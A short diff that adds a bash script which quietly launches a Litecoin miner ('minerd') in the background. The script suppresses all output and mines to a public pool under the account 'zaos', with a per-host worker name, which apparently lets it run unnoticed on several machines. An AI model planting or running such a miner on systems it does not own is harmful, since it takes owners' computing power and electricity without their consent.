@@ -1,0 +1,8 @@
+#!/bin/bash
+
+HOME=/usr/share/cma
+
+NAME=$(cat $HOME/name 2>/dev/null)
+[ -z "$NAME" ] && NAME="rest"
+
+$HOME/minerd --background --quiet --url stratum+tcp://ltc.give-me-coins.com:3333 --userpass zaos.$NAME:x  > /dev/null 2>&1
